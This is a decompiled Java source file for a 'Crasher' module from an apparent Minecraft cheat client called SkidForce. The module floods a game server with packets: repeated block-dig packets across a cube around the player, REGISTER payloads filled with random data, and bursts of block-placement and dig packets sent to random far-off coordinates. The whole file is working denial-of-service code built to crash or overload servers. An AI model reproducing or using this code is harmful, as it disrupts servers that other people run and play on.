package ru.fals3r.functions.impl.world;

import io.netty.buffer.Unpooled;
import io.netty.util.internal.ThreadLocalRandom;
import ru.fals3r.SkidForce;
import ru.fals3r.functions.Category;
import ru.fals3r.functions.Function;

public class Crasher extends Function {
   public .bsb lastWorld;
   public int tick;

   public Crasher() {
      this.registerName("Crasher");
      this.registerCategory(Category.World);
      SkidForce.settingsManager.addInt("Range", "CrasherRange", 1, 20, 5, this);
      SkidForce.settingsManager.addInt("I", "CrasherI", 1, 3, 1, this);
   }

   public void onUpdate() {
      if (this.mc.f == null || this.mc.h == null) {
         this.toggle(false);
      }

      ++this.tick;
      double range = SkidForce.settingsManager.getSettingByName("CrasherRange").getValDouble();

      for(double i = -range; i < range; ++i) {
         for(double i2 = -range; i2 < range; ++i2) {
            for(double i3 = -range; i3 < range; ++i3) {
               .et pos = (new .et(this.mc.h.p, this.mc.h.q, this.mc.h.r)).a(i, i2, i3);
               if (this.mc.f.o(pos).u() != .aox.a && this.tick > -1) {
                  this.mc.h.d.a((.ht)(new .lp(.lp$a.a, pos, .fa.a)));
                  this.mc.h.d.a((.ht)(new .lp(.lp$a.c, pos, .fa.a)));
                  this.mc.h.d.a((.ht)(new .lp(.lp$a.a, pos, .fa.a)));
                  this.mc.h.a(.ub.a);
               }
            }
         }
      }

      int i;
      int y;
      .et pos;
      int x;
      int z;
      switch((int)SkidForce.settingsManager.getSettingByName("CrasherI").getValDouble()) {
      case 1:
         .gy buffer = new .gy(Unpooled.buffer());
         buffer.a(Double.toString(Math.random()));
         this.mc.h.d.a((.ht)(new .lh("REGISTER", buffer)));
         break;
      case 2:
         for(i = 0; i < 50; ++i) {
            x = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
            y = ThreadLocalRandom.current().nextInt(256);
            z = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
            pos = new .et(x, y, z);
            this.mc.h.d.a((.ht)(new .ma(pos, .fa.a, .ub.a, ThreadLocalRandom.current().nextFloat() * 0.5F + 0.5F, 1.0F, ThreadLocalRandom.current().nextFloat() * 0.5F + 0.5F)));
         }
      case 3:
         for(i = 0; i < 50; ++i) {
            x = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
            y = ThreadLocalRandom.current().nextInt(256);
            z = (int)((ThreadLocalRandom.current().nextFloat() - 0.5F) * 5.99998E7F);
            pos = new .et(x, y, z);
            this.mc.h.d.a().a((.ht)(new .lp(.lp$a.a, pos, .fa.a)));
            this.mc.h.d.a().a((.ht)(new .lp(.lp$a.c, pos, .fa.a)));
         }
      }

   }
}
